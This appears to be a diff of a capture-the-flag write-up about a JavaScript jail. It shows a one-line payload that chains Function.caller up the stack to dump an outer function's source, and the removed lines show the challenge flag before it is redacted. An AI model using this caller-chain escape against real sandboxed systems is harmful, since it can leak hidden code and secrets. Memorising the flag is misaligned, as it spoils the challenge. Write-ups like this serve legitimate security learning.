@@ -61,7 +61,7 @@ this proved my idea, so i used caller repeatedly and finally got the flag as bel
 home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
 function (err, line) {
 
-    // flag : 50_y0u_f1n4lly_f0und_17
+    // flag : [redacted]
 
     if (err && wait === false) {
       return callback(err);
@@ -76,6 +76,6 @@ function (err, line) {
       [..stripped..]
 ```
 
-and sha256 of the `50_y0u_f1n4lly_f0und_17` gives us another 150pts.
+and sha256 of the `[redacted]` gives us another 150pts.
 
 HAMIDx9
